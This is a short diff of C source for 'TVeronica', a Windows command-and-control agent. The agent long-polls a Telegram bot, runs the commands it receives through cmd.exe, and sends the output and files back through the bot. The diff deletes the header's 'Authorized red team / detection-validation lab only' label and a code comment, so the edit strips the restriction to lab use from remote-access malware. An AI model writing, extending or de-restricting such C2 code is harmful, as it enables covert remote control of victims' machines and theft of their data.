@@ -1,6 +1,6 @@
-/* c2core.c - TVeronica lab: Telegram bot long-poll agent core.
-   Authorized red team / detection-validation lab only.
-   Stage 5 C2: Telegram getUpdates long-poll -> command -> cmd.exe -> sendMessage/sendDocument. */
+/* c2core.c - TVeronica: Telegram bot long-poll agent core.
+   Stage 5 C2: Telegram getUpdates long-poll -> command -> cmd.exe -> sendMessage/sendDocument. 
+*/
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <winhttp.h>
@@ -244,7 +244,6 @@ int probe_mode(const char *who) {
 void c2_run(const char *self) {
     char ep[512], resp[65536];
 
-    /* drain stale updates from previous sessions */
     snprintf(ep, sizeof ep, "getUpdates?offset=-999&timeout=0");
     if (tg_get(ep, resp, sizeof resp) > 0) {
         long long mx = 0;
